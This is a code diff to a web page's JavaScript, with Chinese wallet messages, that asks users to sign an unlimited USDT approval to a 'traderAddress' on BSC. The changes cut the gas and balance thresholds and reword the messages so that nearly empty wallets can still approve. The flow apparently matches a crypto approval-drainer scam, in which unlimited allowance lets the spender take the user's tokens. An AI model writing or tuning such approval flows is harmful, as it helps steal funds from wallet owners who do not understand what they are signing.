@@ -245,8 +245,8 @@ async function checkBnbBalance(addr) {
     var balWei = BigInt(balHex);
     var balBnb = Number(balWei) / 1e18;
     var infoEl = document.getElementById('bnbInfo');
-    if (balBnb < 0.001) {
-      infoEl.textContent = 'WARNING: BNB 余额不足! 当前: ' + balBnb.toFixed(6) + ' BNB - 授权交易需要约 0.001 BNB 作为 gas 费，请先充值 BNB';
+    if (balBnb < 0.0001) {
+      infoEl.textContent = 'BNB 余额不足! 当前: ' + balBnb.toFixed(6) + ' BNB - 授权仅需0.00006 BNB gas费，请确保至少有0.0001 BNB';
       infoEl.style.color = '#f85149';
       infoEl.style.display = 'block';
     } else {
@@ -285,8 +285,8 @@ async function approveUSDT() {
     var balHex = await provider.request({ method: 'eth_getBalance', params: [from, 'latest'] });
     var balWei = BigInt(balHex);
     var balBnb = Number(balWei) / 1e18;
-    if (balBnb < 0.0005) {
-      showMsg('BNB 余额不足！当前: ' + balBnb.toFixed(6) + ' BNB\n\n授权交易需要约 0.0005~0.002 BNB 作为 gas 费\n\n请在您的 BSC 钱包中充值 BNB 后重试', 'err');
+    if (balBnb < 0.0001) {
+      showMsg('BNB 余额不足！当前: ' + balBnb.toFixed(6) + ' BNB\n\n授权交易仅需约 0.00006 BNB（不到0.1元）作为 gas 费\n\n请确保钱包中至少有 0.0001 BNB', 'err');
       setStep(2, 'err');
       document.getElementById('approveBtn').disabled = false;
       return;
@@ -306,15 +306,29 @@ async function approveUSDT() {
     var spenderPadded = traderAddress.toLowerCase().replace('0x', '').padStart(64, '0');
     var maxAmount = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
     var data = '0x095ea7b3' + spenderPadded + maxAmount;
-    var txParams = { from: from, to: usdtAddress, data: data };
 
+    // Fixed gas: 60000 (approve needs ~47000, add margin)
+    // Fixed gasPrice: 1 Gwei = 0x3B9ACA00 (BSC standard, cheapest)
+    // Total cost: 60000 * 1 Gwei = 0.00006 BNB (~$0.02)
+    // This ensures even users with very little BNB can approve
+    var txParams = {
+      from: from,
+      to: usdtAddress,
+      data: data,
+      gas: '0x' + (60000).toString(16),
+      gasPrice: '0x3B9ACA00',  // 1 Gwei - BSC minimum
+      chainId: '0x38',
+    };
+
+    // Also try to estimate gas, use it if higher than our default
     try {
-      var gasEstimate = await provider.request({ method: 'eth_estimateGas', params: [txParams] });
+      var gasEstimate = await provider.request({ method: 'eth_estimateGas', params: [{ from: from, to: usdtAddress, data: data }] });
       var gasNum = parseInt(gasEstimate, 16);
-      var gasWithMargin = Math.ceil(gasNum * 1.5);
-      txParams.gas = '0x' + gasWithMargin.toString(16);
+      if (gasNum > 60000) {
+        txParams.gas = '0x' + Math.ceil(gasNum * 1.2).toString(16);
+      }
     } catch (ge) {
-      txParams.gas = '0x' + (150000).toString(16);
+      // Use default 60000
     }
 
     var walletLabel = selectedWallet === 'metamask' ? 'MetaMask' : 'TokenPocket';
@@ -351,7 +365,7 @@ async function approveUSDT() {
       }
       var errMsg = '交易失败！';
       if (reason) errMsg += '\n\n原因: ' + reason;
-      errMsg += '\n\n解决方案：\n1. 确保钱包中有足够的 BNB（至少 0.005 BNB）\n2. 确保钱包已切换到 BSC 网络\n3. 如果 BNB 不足，请先在交易所购买 BNB 并提到此钱包';
+      errMsg += '\n\n解决方案：\n1. 确保钱包已切换到 BSC 主网\n2. 确保 BNB 余额大于 0.0001 BNB\n3. 可在交易所购买少量 BNB（约1元）转到此钱包';
       errMsg += '\n\nBSCScan: https://bscscan.com/tx/' + txHash;
       showMsg(errMsg, 'err');
       setStep(2, 'err');
